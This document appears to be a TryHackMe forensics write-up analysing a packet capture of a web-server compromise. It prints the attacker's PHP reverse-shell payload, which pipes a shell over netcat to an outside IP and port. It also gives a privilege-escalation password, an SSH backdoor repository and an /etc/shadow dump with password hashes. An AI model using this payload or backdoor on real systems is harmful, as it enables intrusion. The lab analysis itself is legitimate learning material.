

![image](https://github.com/user-attachments/assets/56181f76-e131-4cd7-9986-6523c7062a51)


![image](https://github.com/user-attachments/assets/d17d2a70-268c-435b-b5c0-1ecea5595ff3)




<h2>Task 1. Forencics - Analyse the PCAP</h2>

<br>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

<br>

> 1.1. <em>What was the URL of the page they used to upload a reverse shell?</em><br><a id='1.1'></a>
>> <code><strong>/development/</strong></code>


<br>

![image](https://github.com/user-attachments/assets/65b16fd5-d17f-4045-b9eb-ce90853d922c)


<br>

> 1.2. <em>What payload did the attacker use to gain access?</em><br><a id='1.2'></a>
>> <code><strong><?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?></strong></code>

<br>

![image](https://github.com/user-attachments/assets/60fbc4b9-9521-4ded-81f9-2a4a44489c9a)

<br>

![image](https://github.com/user-attachments/assets/124fa995-0d09-4317-90af-8b3b137de3ab)

<br>

> 1.3. <em>What password did the attacker use to privesc?</em><br><a id='1.3'></a>
>> <code><strong>whenevernoteartinstant</strong></code>


<br>

<p>In previous question, we learned that happended a connection to 192.168.170.145 on port 4242<./p>

<br>

![image](https://github.com/user-attachments/assets/e3a9bd48-6cef-4290-8764-058d9e5e0f35)

<br>

![image](https://github.com/user-attachments/assets/de5baa8c-6804-4370-acff-9e0f6e4b1e27)

<br>

> 1.4. <em>How did the attacker establish persistence?</em><br><a id='1.4'></a>
>> <code><strong>https://github.com/NinjaJc01/ssh-backdoor</strong></code>

<br>

![image](https://github.com/user-attachments/assets/dcd4553c-6b72-4cb4-bc8c-8606e3fe454d)


<br>

> 1.5. <em>Using the fasttrack wordlist, how many of the system passwords were crackable?</em><br><a id='1.4'></a>
>> <code><strong>____________________</strong></code>

<br>

![image](https://github.com/user-attachments/assets/dfd9fdd4-273b-4135-ac88-43a504d8fa0e)

![image](https://github.com/user-attachments/assets/e29c9c86-2785-498c-8c66-c240e103e790)

<pre><code>sudo cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::</code></pre>



<br>


<p>I downloaded the pcap file.</p>

<br>

<p>Opened pcap file in Wireshark.</p>

<br>

![image](https://github.com/user-attachments/assets/7e41c93c-b32e-4d34-a8b9-a1a29bff38dc)





<br>
<h2>Room Complete</h2>
<p>Keep learning, keep growing!</p>

<p align="center"> <img width="750px" src=""></p>

<br>

<p align="center"> <img width="750px" src=""></p>


<br>

<br>


<h2>My Journey<a id='7'></a></h2>
<p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| December 12, 2024 | 220      |       940 th |        19 th |      392 nd |       2 nd | 61,356   |       468 |

</div>


<p align="center"> <img width="750px" src=""></p>

<br>

<p align="center"> <img width="750px" src=""></p>


<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

